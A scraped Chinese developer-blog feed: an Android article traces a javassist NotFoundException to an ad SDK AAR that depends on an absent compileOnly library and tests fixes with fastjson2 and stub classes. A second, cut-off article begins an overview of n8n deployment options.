                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">问题</h2>
<p>在一次项目开发中引入广告sdk第三方aar包后发生项目编译失败的情况。由于自身项目有使用到一个线程统一管理的AGP插件，因此在运行编译前会使用<code>javassist</code>处理项目的类文件（插桩、替换线程方法等工作），也就在这个环节中未找到对应的Class对象而发生异常导致项目无法编译通过。</p>
<pre><code class="hljs language-arduino" lang="arduino">Execution failed <span class="hljs-keyword">for</span> task <span class="hljs-string">':app:transformClassesWithxxx_xxx_xx_plugin_thread_ThreadOptimizerTransformForDebug'</span>.
&gt; javassist.NotFoundException: com.kwai.video.ksvodplayerkit.KSVodPlayerWrapper

</code></pre>
<p>通过编译异常日志可知问题是由于找不到某某类而导致的。然后通过查看依赖的aar包查看时jar包路径下查询并没有找到对应包名，并且在sdk接入说明上没说明需要再依赖其他第三方库等要求。同时可以肯定该报错就是在依赖第三方aar包所引发的问题。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4343ebe0d442456fbd059b27ba0b7e43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=aAKt9xUddq4neoGToh7QBoZCWzE%3D" alt="android_dependency_patterns_20251208154440.png" loading="lazy"/></p>
<p>另外也咨询过第三方库开发同学说明问题:其回复是此类是无用且在具体业务中不会影响正常运行（但无用类为啥会在sdk中出现目前还未知）。好在AGP插件有注册白名单的功能：方案可以在配置中将对应包名先做过滤掉处理，不扫描某些包名即可。</p>
<p>但此问题有点奇妙aar包中并不存在该类，但插件扫描类时又能查询到该类就显得非常诡异。当时并想过会是什么原因造成的问题，只觉得这是一个非常神奇的问题，因此想着搞明白原因并且记录学习一下。</p>
<p>这里先直接说问题的主因：aar包内部使用第三方库compileOnly依赖并且import了其中某个类且在主工程中并没有使用implement依赖这个第三方库，因此无法找到这个第三方库中对应的类。</p>
<h2 data-id="heading-1">排查原因</h2>
<p>通过AGP插件过滤掉对应类之后可编译运行后，查询最终apk的dex文件又可以看到<code>KSVodPlayerWrapper</code>类。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25382744bd1241f58e3f2d61aba7855c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=AYvAqX1xhQ72amsP97%2F34MxikkY%3D" alt="android_dependency_patterns_20251209114514.png" loading="lazy"/></p>
<p>同时该类<code>Find usages</code>在其他类方法中是有执行引用的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eae1bc8c8130408989c61a021329482d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=tfUF4Ijx3jKNF0j60BnHchqum84%3D" alt="android_dependency_patterns_20251209114747.png" loading="lazy"/></p>
<p>具体类是在<code>core.video.a.d.class</code>中继续搜索其<code>d.class</code>的引用则发现并没有其他地方应用了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c20a5bf47d4b1fb599ed627710daa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=Lxq2V47%2F9TWGxbTY2AhIFJCxOA0%3D" alt="android_dependency_patterns_20251209134703.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5a8b8a55d9943a5b9bac17e6c730ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=vLEgy%2FnXwIdRxII5xCdRY0N7V8w%3D" alt="android_dependency_patterns_20251209135004.png" loading="lazy"/></p>
<p>由此推测sdk中打包时包含非内部应该所包含的内容。这里猜测大概率是因为一些公有基础库有相互依赖和调用，在此库中也有所引用但没有剔除干净从而导致携带包含但在外部并不使用的代码。</p>
<h2 data-id="heading-2">模拟场景</h2>
<blockquote>
<p>此外通过<code>jd-gui</code>工具查看<code>dex2jar</code>文件会查询不到对应<code>KSVodPlayerWrapper</code>类；但通过<code>AndridStudio</code>却可以查询到，如参考上述示例图可知。</p>
</blockquote>
<p>为了进一步验证该问题，进行模拟复刻接入第三方SDK包的问题并且看看是否有其他适配方案。</p>
<h3 data-id="heading-3">创建aar模块库</h3>
<p>这里使用fastjson2模拟这个场景：创建aar模块；分别创建Java和kotlin两种引用使用json的方法类；同时使用<code>implementation</code>引用fastjson2。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04803541624b486499febfa8689bf815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=syB8AjHEWRtcGzBh3rsLjApV18Y%3D" alt="android_dependency_patterns_20251208165333.png" loading="lazy"/></p>
<p>这里分别使用java和kotlin两种方式测试最终结果是否存在不同点。</p>
<blockquote>
<p>由于fastjson2特殊性解析纯文本是需要加上<code>JSONReader.Feature.AllowUnQuotedFieldNames</code>才能解析成功。</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSON;
<span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONObject;
<span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONReader;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaTestCompileOnly</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fastjson2Func</span><span class="hljs-params">()</span>{
        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-string">"{name:\"test\",value:123}"</span>;
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(text, JSONReader.Feature.AllowUnQuotedFieldNames);
        System.out.println(<span class="hljs-string">"Parsed JSON: "</span> + data.toString());
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSON
<span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONObject

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TestCompileOnly</span> {


    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span>{
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fastjson2Func</span><span class="hljs-params">()</span></span>{
            <span class="hljs-keyword">val</span> text = <span class="hljs-string">"{}"</span>
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: JSONObject = JSON.parseObject(text)
        }
    }

}
</code></pre>
<p>若是生成aar包其实使用implementation或compileOnly是没有什么区别，两者打包都不会包含fastjson2。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1decd70a5b144448c3b0c3c895cc7d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=N98mN7AlM5xKTwhxjo9gMdE1WIM%3D" alt="android_dependency_patterns_20251208165515.png" loading="lazy"/></p>
<p>查看生成aar包的源代码内容：其中只有调用的测试类，不包含fastjson2相关代码和引用的类方法。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2196342ddb44425b1449aec9b6091d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=dZLcDgSwqnCYl%2B%2FaZnO2aLd73YE%3D" alt="android_dependency_patterns_20251208182306.png" loading="lazy"/></p>
<h3 data-id="heading-4">主工程依赖aar运行测试</h3>
<p>在主工程中以lib形式依赖aar模块包。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55f1d40b74f54121be6781b16efdd21a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=NxBwd7HuFlFAsFQ6qADs4dLDNDs%3D" alt="android_dependency_patterns_20251208175105.png" loading="lazy"/></p>
<p>在主工程测试页面分别增加执行aar模块中调用fastjson2的代码。</p>
<pre><code class="hljs language-koltin" lang="koltin">
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        (rootView as LinearLayout).addView(Button(this).apply {
            text = "JavaTestCompileOnly"
            isAllCaps = false
            setOnClickListener {

                JavaTestCompileOnly.fastjson2Func()
            }
        })

        (rootView as LinearLayout).addView(Button(this).apply {
            text = "TestCompileOnly"
            isAllCaps = false
            setOnClickListener {
                TestCompileOnly.fastjson2Func()
            }
        })

    }

</code></pre>













<table><thead><tr><th>Java方法</th><th>Kotlin方法</th></tr></thead><tbody><tr><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bdbabbff5c2c47b8a00855073e7df2bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=SfuTvLbU8qFfoAnxi2UQbpx26z0%3D" alt="android_dependency_patterns_20251208175544.png" loading="lazy"/></td><td><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3471a11c080b499f96dbb126fe26f736~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=lgKkhxugtGy2aslHkdb%2BTuWWvyc%3D" alt="android_dependency_patterns_20251208175719.png" loading="lazy"/></td></tr></tbody></table>
<p>根据异常可知没有找到fastjson2依赖库中对应类。</p>
<p>查询主工程打包的apk中的class.dex文件可知<code>fastjson2</code>集成也存在问题，只有部分依赖进入到项目中。这和上述情况相似当测试方法中引入了<code>fastjson2</code>的JSON依赖，在最终apk包中确实存在生成的<code>JSON</code>类。但是类存在不完整的情况还是会引发异常情况。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/462ae794c4e64a6e95f823614ba59846~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=HjQhTmR1ViDbLmGFtR6zbYYleLs%3D" alt="android_dependency_patterns_20251208174736.png" loading="lazy"/></p>
<p>若在主工程中增加<code>fastjson2</code>依赖再编译运行在执行测试方法则不会发生异常报错。</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-built_in">implementation</span>(libs.fastjson2)
</code></pre>
<p>同时再观察apk包中Class.dex的<code>fastjson2</code>集成会发现显示的方法数和大小是最终依赖的正确状态，整个<code>fastjson2</code>库都集成到项目中了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3af718cb5224cab9e4abb482917c3ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=X4ubCwlDM1VJhzrw1vY3Gj7oQM0%3D" alt="android_dependency_patterns_20251208180827.png" loading="lazy"/></p>
<h2 data-id="heading-5">规避异常</h2>
<p>像以上用<code>implementation</code>在主工程依赖<code>Fastjson2</code>是表示整个工程需要使用到该功能库才引入的。这也是处理异常情况的一种方案。这里先总结几种规避异常情况可根据项目实际应用择机采取措施。</p>















<table><thead><tr><th>插件功能规避</th><th>引入缺失库</th><th>增加替身类</th></tr></thead><tbody><tr><td>只适用于但编译无法通过时，需要插件内部对其开辟白名单做规避处理；但该方案无法处理运行时可能出现的异常情况</td><td>对缺失的引用在主工程中进行依赖处理；项目中意外忽略了重要依赖的引用且是必要依赖；如果是非必要依赖其功能在项目中并没有真正使用会增加包大小</td><td>复刻缺失的类方案让编译运行时能够正常执行到对应类对象规避非必要的异常崩溃问题；替身方法实现可能为空从而导致执行结果没有任何反应。</td></tr></tbody></table>
<p>本次问题是比较明确的，当下已知是非必要的功能方法且在实际运行时不会执行。因此这里采用增加替身类来保证项目健壮性规避可能存在的异常。</p>
<h3 data-id="heading-6">替身类</h3>
<p>在项目中创建编译运行时无法查询到的类对象，这里模拟场景调用fastjson2类无法找到的异常情况。创建和fastjson2依赖库一样的包名路径和类方法，同时保持和原方法一样的方法名和返回值类型，必须和原对象保持一致。在此只实现简单的相应调用方法即可。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e69c9bd25b1c42a48f0e1940a29afc18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnVseVl1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768295901&amp;x-signature=4frUM95XAWeex2a4kEIgcSorQEY%3D" alt="android_dependency_patterns_20251209112113.png" loading="lazy"/></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.alibaba.fastjson2;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSON</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">parseObject</span><span class="hljs-params">(String text)</span>{

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();
    }
}

</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.alibaba.fastjson2;

<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;
<span class="hljs-keyword">import</span> java.util.LinkedHashMap;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSONObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;String, Object&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p>至此再运行项目时当调用<code>TestCompileOnly.fastjson2Func()</code>就不会再出现异常崩溃了。</p>
<p>此方案与releaseImplementation和debugImplementation有相似之处，多个环境下都要保持方法都能被正常调用但实际执行的方法内部能力有所不同。</p>
<blockquote>
<p>只不过这里增加替身类是为了规避异常而做的适配工作。</p>
</blockquote>
<h2 data-id="heading-7">总结</h2>
<p>到此就能够解释最开始的问题：aar包没有对应的类但在最终打包的apk有相应类。第三方sdk的aar也和模拟场景中一样引用了外部依赖但在主项目中没有最终依赖从而导致类丢失。虽然最终项目（没有特殊插件校验情况下）编译通过了，但是也引入一个不存在在项目中的“空类”。</p>
<p>即使是“空类”可能在内部不会被真实执行到，但其还是存在安全隐患。万一或者可能特殊场景下（hook情况、编译插件预处理等）真的被调用了那必然引发程序崩溃的情况。因此在某些场景下还是需要做一些保护方案以防止不必要异常隐患。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[N8N从零开始到精通-(2)N8N部署(多种方式)]]></title>    <link>https://juejin.cn/post/7592058763985846318</link>    <guid>https://juejin.cn/post/7592058763985846318</guid>    <pubDate>2026-01-06T07:55:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763985846318" data-draft-id="7591948263860699174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="N8N从零开始到精通-(2)N8N部署(多种方式)"/> <meta itemprop="keywords" content="AIOps"/> <meta itemprop="datePublished" content="2026-01-06T07:55:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="源宇宙十三站"/> <meta itemprop="url" content="https://juejin.cn/user/1153816643768987"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            N8N从零开始到精通-(2)N8N部署(多种方式)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1153816643768987/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    源宇宙十三站
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:55:08.000Z" title="Tue Jan 06 2026 07:55:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">N8N从零开始到精通-(2)N8N部署(多种方式)</h2>
<h3 data-id="heading-1">一、你是不是也这样</h3>
<p>你是不是也遇到过这样的困惑？</p>
<p>看完上一篇文章，对N8N心动了，想要马上试试。结果打开官网，看到一堆安装方式：npm、Docker、Docker Compose、n8n Cloud...瞬间就懵了："我该选哪个？它们有什么区别？哪个最简单？哪个最适合我？"</p>
<p>或者，你尝试按照某个教程安装，结果发现：</p>
<ul>
<li>教程说"5分钟搞定"，你花了2小时还在报错</li>
<li>别人用Docker一键启动，你这边Node.js版本不对，npm安装失败</li>
<li>好不容易装好了，发现数据没保存，重启后工作流全没了</li>
<li>想在生产环境部署，但不知道如何配置数据库、如何设置安全认证</li>
</ul>
<p><strong>你是不是也在想：有没有一个清晰的指南，告诉我每种安装方式适合什么场景，以及如何一步步正确部署，避免踩坑？</strong></p>
<p>如果你也有这样的困扰，那今天这篇文章就是为你准备的。我会详细介绍N8N的四种主要部署方式，帮你找到最适合你的那一种。</p>
<hr/>
<h3 data-id="heading-2">二、方案概述</h3>
<p><strong>N8N提供了多种部署方式，每种都有其适用场景</strong>。简单来说，你可以这样选择：</p>
<p><strong>快速体验</strong>：使用 <code>npx n8n</code>，无需安装，5秒启动，适合临时测试。</p>
<p><strong>本地开发</strong>：使用 <code>npm install -g n8n</code>，直接安装到系统，适合经常使用的开发者。</p>
<p><strong>推荐生产</strong>：使用 <code>Docker</code>或 <code>Docker Compose</code>，隔离环境、易于管理、方便迁移，适合正式部署。</p>
<p><strong>省心省力</strong>：使用 <code>n8n Cloud</code>，官方托管服务，免去运维烦恼（付费）。</p>
<p>今天这篇文章，我会重点讲解前三种自托管方式，让你能够根据自己的需求选择最合适的部署方法。每种方式我都会提供详细的步骤说明和实战案例，确保你能成功部署。</p>
<hr/>
<h3 data-id="heading-3">三、正文科普（干货满满，喂到嘴里）</h3>
<h4 data-id="heading-4">3.1 部署方式全景图</h4>
<p>在深入了解每种部署方式之前，我们先来理解一下N8N部署的"全家福"：</p>
<pre><code class="hljs">┌─────────────────────────────────────────────────┐
│            N8N部署方式选择指南                    │
├─────────────────────────────────────────────────┤
│                                                  │
│  1. npx n8n          → 零安装，快速体验          │
│  2. npm全局安装       → 本地开发，简单直接        │
│  3. Docker单容器      → 推荐生产，隔离环境       │
│  4. Docker Compose    → 企业级，完整方案         │
│  5. n8n Cloud         → 托管服务，省心省力       │
│                                                  │
